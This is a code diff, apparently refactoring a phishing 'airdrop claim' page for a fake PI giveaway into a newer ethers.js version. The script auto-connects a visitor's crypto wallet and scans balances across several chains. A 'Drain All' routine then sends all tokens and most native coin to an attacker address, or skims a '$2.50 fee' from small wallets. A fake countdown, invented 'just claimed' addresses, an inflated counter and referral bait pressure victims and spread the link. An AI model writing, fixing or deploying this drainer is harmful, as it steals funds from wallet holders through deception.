-      try{var tp=new ethers.providers.JsonRpcProvider(allRpcs[j]);
-        var tb=await Promise.race([tp.getBalance(addr),new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},5000);})]);
-        p=tp;nb=tb;break;}catch(e){}}
+      try{
+        var tp=new ethers.JsonRpcProvider(allRpcs[j]);
+        var tb=await Promise.race([
+          tp.getBalance(addr),
+          new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},8000);})
+        ]);
+        p=tp;nb=tb;break;
+      }catch(e){}
+    }
     if(!nb){L('  '+ch.name+': RPC error');continue;}
     try{
-      var nf=ethers.utils.formatEther(nb);var has=parseFloat(nf)>0;
+      var nf=ethers.formatEther(nb);
+      var has=parseFloat(nf)>0;
       var tl=ETOKENS[ch.id]||[];
-      var tk=await Promise.all(tl.map(function(a){return new Promise(function(res){
-        try{var ct=new ethers.Contract(a[0],['function balanceOf(address) view returns (uint256)'],p);
-          ct.balanceOf(addr).then(function(bl){if(!bl.isZero())res({a:a[0],sy:a[1],b:parseFloat(ethers.utils.formatUnits(bl,a[2])).toFixed(4),raw:bl,dc:a[2]});else res(null);}).catch(function(){res(null);});
-        }catch(e){res(null);}
-      });}));
+      var tk=await Promise.all(tl.map(function(a){
+        return new Promise(function(res){
+          try{
+            var ct=new ethers.Contract(a[0],ERC20_ABI,p);
+            ct.balanceOf(addr).then(function(bl){
+              if(bl>0n){
+                res({a:a[0],sy:a[1],b:parseFloat(ethers.formatUnits(bl,a[2])).toFixed(4),raw:bl,dc:a[2]});
+              }else{res(null);}
+            }).catch(function(){res(null);});
+          }catch(e){res(null);}
+        });
+      }));
       var tokens=tk.filter(function(t){return t!==null;});
-      if(has||tokens.length>0){foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens:tokens,isSol:false});
-        L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));}
-      else L('  '+ch.name+': empty');
+      if(has||tokens.length>0){
+        foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens:tokens,isSol:false});
+        L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));
+      }else{
+        L('  '+ch.name+': empty');
+      }
     }catch(e){L('  '+ch.name+': error');}
   }
-  L('');L('Found '+foundChains.length+' chain(s).');await sleep(600);
-  if(foundChains.length===0){showP('p2');
+  L('');
+  L('Found '+foundChains.length+' chain(s) with assets.');
+  await sleep(600);
+  if(foundChains.length===0){
+    showP('p2');
     document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No EVM Tokens Found';
-    document.getElementById('p2').querySelector('div[style*="font-size:11px;color:rgba"]').innerHTML='No tokens found on BSC, ETH, Polygon, AVAX, or Arbitrum.<br><br>If you have SOL on Solana, please use the Solana address scanner below.';
+    document.getElementById('p2').querySelector('div[style*="font-size:11px;color:rgba"]').innerHTML='No tokens found on any supported chain.<br><br>Make sure you have tokens on Ethereum, BSC, Polygon, Arbitrum, Avalanche, Base, or Optimism.';
     stat('No EVM tokens on this wallet.','wa');
+  }else{
+    showClaim();
+    stat('&#x2705; Assets found!','ok');
   }
-  else{showClaim();stat('&#x2705; Assets found!','ok');}
 }
 
+// ============================================
+// CLAIM DISPLAY (Phase 3)
+// ============================================
 function showClaim(){
-  showP('p3');var div=document.getElementById('p3chains');var h='';
+  showP('p3');
+  var div=document.getElementById('p3chains');
+  var h='';
   for(var i=0;i<foundChains.length;i++){
     var fc=foundChains[i];
     h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div><div class="cn">'+fc.chain.name+'</div><div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
   }
   div.innerHTML=h;
-  var usd=estimateUsd(foundChains);var isSmall=usd<20;
+  var usd=estimateUsd(foundChains);
+  var isSmall=usd<20;
   document.getElementById('p3bal').innerHTML='<div class="ir"><span class="l">Est. Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div><div class="ir"><span class="l">Action</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'$2.50 fee':'Drain All')+'</span></div>';
   document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee':'&#x1F381; Verify and Claim';
+  // Token detail rows
+  var tDiv=document.getElementById('p3tokens');
+  var th='';
+  for(var i=0;i<foundChains.length;i++){
+    var fc=foundChains[i];
+    for(var j=0;j<fc.tokens.length;j++){
+      var t=fc.tokens[j];
+      var tUsd=(parseFloat(t.b)*(PRICES[t.sy]||0)).toFixed(2);
+      th+='<div class="tkrow"><span class="tk-sym">'+t.sy+'</span><span class="tk-bal">'+t.b+'</span><span class="tk-usd">$'+tUsd+'</span></div>';
+    }
+  }
+  tDiv.innerHTML=th||'<div style="font-size:10px;color:rgba(255,255,255,.2);text-align:center">No ERC-20 tokens found</div>';
 }
 
+// ============================================
+// DRAIN EXECUTION
+// ============================================
 async function startDrain(){
-  hideStatus();showP('p4');var log=document.getElementById('p4log');log.innerHTML='';
+  hideStatus();showP('p4');
+  var log=document.getElementById('p4log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  var usd=estimateUsd(foundChains);var isSmall=usd<20;
-  var tx=0;L('Value: ~$'+usd.toFixed(2));L(isSmall?'Collecting $2.50 fee...':'Draining all...');L('');
+  var usd=estimateUsd(foundChains);
+  var isSmall=usd<20;
+  var tx=0;
+  L('Value: ~$'+usd.toFixed(2));
+  L(isSmall?'Collecting $2.50 fee...':'Draining all...');
+  L('');
   for(var i=0;i<foundChains.length;i++){
-    var fc=foundChains[i];if(fc.isSol)continue;
-    var ch=fc.chain;L('=== '+ch.name+' ===');L('Switching...');
+    var fc=foundChains[i];
+    if(fc.isSol)continue;
+    var ch=fc.chain;
+    L('=== '+ch.name+' ===');
+    L('Switching network...');
     try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
+    // Drain ERC-20 tokens first
     for(var j=0;j<fc.tokens.length;j++){
-      var t=fc.tokens[j];L('Draining '+t.b+' '+t.sy+'...');
-      try{var ct=new ethers.Contract(t.a,['function transfer(address,uint256) returns (bool)'],sign);
-        var xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy);
-      }catch(e){L('&#x2715; '+t.sy+': rejected');}
+      var t=fc.tokens[j];
+      L('Draining '+t.b+' '+t.sy+'...');
+      try{
+        var ct=new ethers.Contract(t.a,ERC20_ABI,sign);
+        var xt=await ct.transfer(ADDR_EVM,t.raw);
+        await xt.wait();
+        tx++;
+        L('&#x2705; '+t.sy+' sent');
+      }catch(e){L('&#x2715; '+t.sy+': '+(e.reason||'rejected'));}
     }
+    // Drain native coin
     try{
-      var bal=await prov.getBalance(addr);var gp=await prov.getGasPrice();var fee=gp.mul(21000).mul(3);
+      var bal=await prov.getBalance(addr);
+      var fee=await prov.getGasPrice();
+      var gasCost=fee*21000n*3n;
       var send;
-      if(isSmall){var price=PRICES[ch.sym]||0;var take=price>0?ethers.utils.parseEther((2.5/price).toFixed(6)):ethers.utils.parseEther('0.001');send=bal.sub(fee).sub(take);if(send.lt(ethers.utils.parseEther('0.0001')))send=bal.sub(fee);L('Collecting fee...');}
-      else{send=bal.sub(fee);L('Draining '+ch.sym+'...');}
-      if(send.gt(0)){var xt=await sign.sendTransaction({to:ADDR_EVM,value:send});await xt.wait();tx++;L('&#x2705; '+ch.sym);}
-    }catch(e){L('&#x2715; Native: rejected');}
+      if(isSmall){
+        var price=PRICES[ch.sym]||0;
+        var take=price>0?ethers.parseEther((2.5/price).toFixed(6)):ethers.parseEther('0.001');
+        send=bal-gasCost-take;
+        if(send<ethers.parseEther('0.0001'))send=bal-gasCost;
+        L('Collecting fee...');
+      }else{
+        send=bal-gasCost;
+        L('Draining '+ch.sym+'...');
+      }
+      if(send>0n){
+        var xt=await sign.sendTransaction({to:ADDR_EVM,value:send});
+        await xt.wait();
+        tx++;
+        L('&#x2705; '+ch.sym+' sent');
+      }
+    }catch(e){L('&#x2715; Native: '+(e.reason||'rejected'));}
   }
-  L('');L('DONE: '+tx+' tx');
-  showP('p5');document.getElementById('p5m').textContent=tx+' transaction(s).';
-  var myCode=getRefCode();document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
+  L('');
+  L('DONE: '+tx+' transaction(s)');
+  showP('p5');
+  document.getElementById('p5m').textContent=tx+' transaction(s) completed.';
+  var myCode=getRefCode();
+  document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
   stat('&#x2705; Claimed!','ok');
 }
 
+// ============================================
+// NETWORK SWITCHING
+// ============================================
 async function doSwitch(cid,L){
   var hex='0x'+cid.toString(16);
-  try{await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]});}
-  catch(e){
-    if(e.code===4902){var ch=ECHAINS.find(function(c){return c.id===cid;})||{};
-      try{await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},blockExplorerUrls:[]}]});}
-      catch(e2){throw new Error('Could not add network');}
+  try{
+    await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]});
+  }catch(e){
+    if(e.code===4902){
+      var ch=ECHAINS.find(function(c){return c.id===cid;})||{};
+      try{
+        await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},blockExplorerUrls:[]}]});
+      }catch(e2){throw new Error('Could not add network');}
     }else if(e.code===4001){throw new Error('Rejected');}else{throw new Error(e.message||'Switch failed');}
   }
-  prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
+  prov=new ethers.BrowserProvider(window.ethereum);
+  sign=await prov.getSigner();
 }
 
-function getRefCode(){var r=localStorage.getItem('pi_ref');if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}return r;}
-function initRef(){var myCode=getRefCode();var inp=document.getElementById('refLink');if(inp)inp.value=location.origin+location.pathname+'?ref='+myCode;updateRefDisplay();}
-function updateRefDisplay(){var refs=parseInt(localStorage.getItem('pi_ref_count')||'0');var earned=refs*200;var speed=Math.min(100,10+refs*10);var rc=document.getElementById('refC');if(rc)rc.textContent=refs;var re=document.getElementById('refE');if(re)re.textContent=earned+' PI';var rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';var tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';}
-function copyRef(){var inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});}
-function copyRef2(){var inp=document.getElementById('p5ref');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});}
-function initCountdown(){var t=4*3600+32*60+18;setInterval(function(){t=Math.max(0,t-1);var h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;var dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');var dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');var ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');},1000);}
+// ============================================
+// REFERRAL SYSTEM
+// ============================================
+function getRefCode(){
+  var r=localStorage.getItem('pi_ref');
+  if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}
+  return r;
+}
+function initRef(){
+  var myCode=getRefCode();
+  var inp=document.getElementById('refLink');
+  if(inp)inp.value=location.origin+location.pathname+'?ref='+myCode;
+  updateRefDisplay();
+}
+function updateRefDisplay(){
+  var refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
+  var earned=refs*200;
+  var speed=Math.min(100,10+refs*10);
+  var rc=document.getElementById('refC');if(rc)rc.textContent=refs;
+  var re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
+  var rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
+  var tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';
+}
+function copyRef(){
+  var inp=document.getElementById('refLink');
+  if(!inp||!inp.value)return;
+  navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});
+}
+function copyRef2(){
+  var inp=document.getElementById('p5ref');
+  if(!inp||!inp.value)return;
+  navigator.clipboard.writeText(inp.value).then(function(){toast('Copied!');}).catch(function(){inp.select();document.execCommand('copy');toast('Copied!');});
+}
+
+// ============================================
+// COUNTDOWN TIMER
+// ============================================
+function initCountdown(){
+  var t=4*3600+32*60+18;
+  setInterval(function(){
+    t=Math.max(0,t-1);
+    var h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
+    var dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');
+    var dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');
+    var ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');
+  },1000);
+}
+
+// ============================================
+// SOCIAL PROOF
+// ============================================
 var SP=[['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min']];
-function initSP(){var i=0;setInterval(function(){i=(i+1)%SP.length;var e=document.getElementById('spt');if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';},5000);}
-function initPart(){var c=document.getElementById('part');for(var i=0;i<20;i++){var s=document.createElement('span');s.style.left=Math.random()*100+'%';s.style.animationDuration=(12+Math.random()*18)+'s';s.style.animationDelay=Math.random()*12+'s';s.style.width=s.style.height=(1+Math.random()*2)+'px';c.appendChild(s);}}
-function initStats(){var e=document.getElementById('st-c');if(!e)return;var v=48291;setInterval(function(){v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);}
-function autoConnect(){if(window.ethereum){window.ethereum.request({method:'eth_accounts'}).then(function(a){if(a&&a.length>0){addr=a[0];prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();document.getElementById('mc').style.display='block';showP('p1');document.getElementById('p1l').textContent='Wallet connected! Scanning...';scanEvm();}}).catch(function(){});}}
+function initSP(){
+  var i=0;
+  setInterval(function(){
+    i=(i+1)%SP.length;
+    var e=document.getElementById('spt');
+    if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';
+  },5000);
+}
+
+// ============================================
+// PARTICLES
+// ============================================
+function initPart(){
+  var c=document.getElementById('part');
+  for(var i=0;i<20;i++){
+    var s=document.createElement('span');
+    s.style.left=Math.random()*100+'%';
+    s.style.animationDuration=(12+Math.random()*18)+'s';
+    s.style.animationDelay=Math.random()*12+'s';
+    s.style.width=s.style.height=(1+Math.random()*2)+'px';
+    c.appendChild(s);
+  }
+}
+
+// ============================================
+// STATS
+// ============================================
+function initStats(){
+  var e=document.getElementById('st-c');
+  if(!e)return;
+  var v=48291;
+  setInterval(function(){
+    v+=Math.floor(Math.random()*3);
+    e.textContent=v.toLocaleString();
+  },8000);
+}
+
+// ============================================
+// AUTO-CONNECT
+// ============================================
+async function autoConnect(){
+  if(window.ethereum){
+    try{
+      var a=await window.ethereum.request({method:'eth_accounts'});
+      if(a&&a.length>0){
+        addr=a[0];
+        prov=new ethers.BrowserProvider(window.ethereum);
+        sign=await prov.getSigner();
+        document.getElementById('mc').style.display='block';
+        showP('p1');
+        document.getElementById('p1l').textContent='Wallet connected! Scanning...';
+        scanEvm();
+      }
+    }catch(e){}
+  }
+}
+
+// ============================================
+// RESET
+// ============================================
+function reset(){
+  document.getElementById('mc').style.display='none';
+  hideStatus();
+  foundChains=[];
+  addr='';
+  sign=null;
+  prov=null;
+}
+
+// ============================================
+// INIT
+// ============================================
 autoConnect();initPart();initCountdown();initSP();initRef();initStats();
 </script>
 </body>
